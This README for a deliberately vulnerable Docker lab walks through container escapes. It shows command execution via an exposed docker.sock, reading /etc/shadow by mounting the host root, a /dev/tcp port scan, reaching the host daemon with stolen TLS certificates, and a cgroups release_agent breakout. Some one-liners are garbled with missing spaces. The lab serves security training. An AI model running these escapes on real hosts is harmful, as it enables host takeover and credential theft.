# Damn Vulnerable Docker Container

## Getting Started

```
$ docker build --tag dvdc:1.0 .
$ docker run -d --network host -v /var/run/docker.sock:/var/run/docker.sock --name dvdc dvdc:1.0
```

## Exercises

### Docker Sockets

#### Exercise 1: Querying the API

In this exercise, the host's docker.sock will be exposed to the container. To get started, drop into a local shell:
```
docker exec -it dvdc /bin/bash
```

With the exposed socket you can make API calls to query running containers, start new containers, and even break out to the host. In this exercises, try to find out what version of Docker is running using the API.

<details>
    <summary>Walkthrough</summary>
    
    # Check if the docker socket is mounted
    user@66a0d5faa124:/# file /var/run/docker.sock
    /var/run/docker.sock: socket

    # Check if it's writable
    user@66a0d5faa124:~$ ls -l /var/run/docker.sock
    srw-rw---- 1 root users 0 Jul  6 03:24 /var/run/docker.sock
    user@66a0d5faa124:~$ groups
    user users

    # Query the API
    user@66a0d5faa124:/# curl --unix-socket /var/run/docker.sock http://localhost/version
    {"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"18.09.6","Details":{"ApiVersion":"1.39","Arch":"amd64","BuildTime":"2019-05-04T02:41:08.000000000+00:00","Experimental":"false","GitCommit":"481bc77","GoVersion":"go1.10.8","KernelVersion":"4.14.116-boot2docker","MinAPIVersion":"1.12","Os":"linux"}}],"Version":"18.09.6","ApiVersion":"1.39","MinAPIVersion":"1.12","GitCommit":"481bc77","GoVersion":"go1.10.8","Os":"linux","Arch":"amd64","KernelVersion":"4.14.116-boot2docker","BuildTime":"2019-05-04T02:41:08.000000000+00:00"}
</details>

#### Exercise 2: Command execution

Now that we know we can query the API via the mounted socket we can use the exposed functionality to execute commands as the container's root user. You can use the `/exec` endpoint to accomplish this.

<details>
    <summary>Walkthrough</summary>

    # Send and execute a command
    user@66a0d5faa124:~$ curl -insecure -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/containers/dvdc/exec -d '{"AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "touch /tmp/success"]}'
    HTTP/1.1 201 Created
    Api-Version: 1.39
    Content-Type: application/json
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.6 (linux)
    Date: Mon, 06 Jul 2020 06:49:14 GMT
    Content-Length: 74

    {"Id":"dd8dd0cd94b8a3821eaa2b236f1a1c74a60e3c0f17857647f3d1cefc44b40c67"}
    user@66a0d5faa124:~$ curl -insecure -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock http://localhost/exec/dd8dd0cd94b8a3821eaa2b236f1a1c74a60e3c0f17857647f3d1cefc44b40c67/start -d '{}'
    HTTP/1.1 200 OK
    Content-Type: application/vnd.docker.raw-stream
    Api-Version: 1.39
    Docker-Experimental: false
    Ostype: linux
    Server: Docker/18.09.6 (linux)

    user@66a0d5faa124:~$ ls -la /tmp
    total 8
    drwxrwxrwt 1 root root 4096 Jul  6 06:50 .
    drwxr-xr-x 1 root root 4096 Jul  6 06:45 ..
    -rw-r--r-- 1 user user    0 Jul  6 06:50 success
</details>


#### Exercise 3: Reading the host filesystem

Code execution is great, but the API can be abused to create new containers and read the host filesystem. You can use the `/containers/create` endpoint to do this.
<details>
    <summary>Walkthrough</summary>

    # Deploy a new container called "escape", mount the host's filesystem to `/host` and then run `cat /host/etc/shadow`
    curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d'{"Image":"ubuntu:latest","Cmd":["cat", "/host/etc/shadow"],"Mounts":[{"Type":"bind","Source":"/","Target":"/host"}]}'"http://localhost/containers/create?name=escape"

    # Start the container
    curl -XPOST --unix-socket /var/run/docker.sock "http://localhost/containers/escape/start"

    # Read the output of the command
    curl --output - --unix-socket /var/run/docker.sock "http://localhost/containers/escape/logs?stdout=true"

    # Clean up
    curl -XDELETE --unix-socket /var/run/docker.sock "http://localhost/containers/escape"
</details>

#### Exercise 4: Communicating with the Docker Daemon with static docker binaries

Now that you can read the host filesystem you can search for sensitive files. In secure docker environments, the dockerd service uses TLS and requires a client to verify itself with a private key. In this exercise, try to use a docker static binary (found [here](https://download.docker.com/linux/static/stable/)) to connect to the host daemon. If TLS is enforced, use the technique in exercise 3 to read the docker certificates and connect to the host daemon.

<details>
    <summary>Walkthrough</summary>

    # Find the IP address of the host
    user@default:~# ip a
    ... snip ...
    3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 08:00:27:02:66:09 brd ff:ff:ff:ff:ff:ff
        inet 192.168.99.102/24 brd 192.168.99.255 scope global eth1
           valid_lft forever preferred_lft forever
        inet6 fe80::a00:27ff:fe02:6609/64 scope link
           valid_lft forever preferred_lft forever
    ... snip ...
    
    # Find open ports
    user@default:~# for port in {1..65535}; do timeout 1 bash -c "echo > /dev/tcp/192.168.99.102/$port" >& /dev/null && echo "port $port is open"; done
    port 22 is open
    port 2376 is open
    port 32888 is open
    
    # Download docker static binaries
    user@default:~# wget https://download.docker.com/linux/static/stable/x86_64/docker-19.03.0.tgz
    Resolving download.docker.com (download.docker.com)... 13.224.180.114, 13.224.180.65, 13.224.180.2, ...
    Connecting to download.docker.com (download.docker.com)|13.224.180.114|:443... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 63255038 (60M) [application/x-tar]
    Saving to: 'docker-19.03.0.tgz'
    
    docker-19.03.0.tgz                       100%[================================================================================>]  60.32M  5.22MB/s    in 11s
    
    2020-07-06 23:16:21 (5.49 MB/s) - 'docker-19.03.0.tgz' saved [63255038/63255038]
    
    # Try to connect to the host
    user@default:~# ./docker/docker -H 192.168.99.102:2376 version
    Client: Docker Engine - Community
     Version:           19.03.0
     API version:       1.40
     Go version:        go1.12.5
     Git commit:        aeac9490dc
     Built:             Wed Jul 17 18:11:50 2019
     OS/Arch:           linux/amd64
     Experimental:      false
    Get http://192.168.99.102:2376/v1.40/version: net/http: HTTP/1.x transport connection broken: malformed HTTP response "\x15\x03\x01\x00\x02\x02".
    * Are you trying to connect to a TLS-enabled daemon without TLS?
    
    # Try again with tls enabled
    user@default:~# ./docker/docker -H 192.168.99.102:2376 --tls version
    Client: Docker Engine - Community
     Version:           19.03.0
     API version:       1.40
     Go version:        go1.12.5
     Git commit:        aeac9490dc
     Built:             Wed Jul 17 18:11:50 2019
     OS/Arch:           linux/amd64
     Experimental:      false
    The server probably has client authentication (--tlsverify) enabled. Please check your TLS client certification settings: Get https://192.168.99.102:2376/v1.40/version: remote error: tls: bad certificate
    
    # Using the technique shown in the previous exercise, find and read the docker certificates.
    # If you installed docker and docker-machine with brew on macos they might be located under `~/.docker/machine/certs/`
    user@default:~# ./docker/docker -H 192.168.99.102:2376 --tls --tlscert=./ca.pem --tlskey=./ca-key.pem version
    Client: Docker Engine - Community
     Version:           19.03.0
     API version:       1.39 (downgraded from 1.40)
     Go version:        go1.12.5
     Git commit:        aeac9490dc
     Built:             Wed Jul 17 18:11:50 2019
     OS/Arch:           linux/amd64
     Experimental:      false
    
    Server: Docker Engine - Community
     Engine:
      Version:          18.09.6
      API version:      1.39 (minimum version 1.12)
      Go version:       go1.10.8
      Git commit:       481bc77
      Built:            Sat May  4 02:41:08 2019
      OS/Arch:          linux/amd64
      Experimental:     false
</details>

#### Exercise 5: Breaking out

Being able to use the docker binary within the container allows you to more easily enumerate the environment, read the build history of containers deploy, new containers, and fully break out of the compromised container. In this exercise, use what you heave learned to deploy a new, privileged container which mounts the host file system by using the exposed docker daemon. Once deployed, drop into a shell with `docker exec` to interact with the filesystem.

### Privileged Mode

Docker has a special privileged mode which, if enabled with the `--privileged` flag, allows a container to access all host devices and kernel capabilities. This feature can be abused on linux hosts via `cgroups`.

The following is a quick and dirty way of getting out of a privileged k8 pod or docker container by using the cgroups release agent feature ([source](https://twitter.com/_fel1x/status/1151487051986087936))
```
(host) docker run -it --rm --privileged ubuntu:latest bash
(cont)# d=`dirname$(ls -x /s*/fs/c*/*/r* |head -n1)`
(cont)# mkdir -p $d/w
(cont)# echo 1 >$d/w/notify_on_release
(cont)# t=`sed -n's/.*\perdir=\([^,]*\).*/\1/p'/etc/mtab`
(cont)# touch /o
(cont)# echo$t/c >$d/release_agent
(cont)# printf'#!/bin/sh\nps >'"$t/o" >/c
(cont)# chmod +x /c
(cont)# sh -c "echo 0 >$d/w/cgroup.procs"
(cont)# sleep 1
(cont)# cat /o
```

## Resources:
- [Abusing Docker API sockets](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)
- [A Methodology for Penetration Testing Docker Systems](https://www.cs.ru.nl/bachelors-theses/2020/Joren_Vrancken___4593847___A_Methodology_for_Penetration_Testing_Docker_Systems.pdf)
- [Break out the Box](https://github.com/brompwnie/botb)
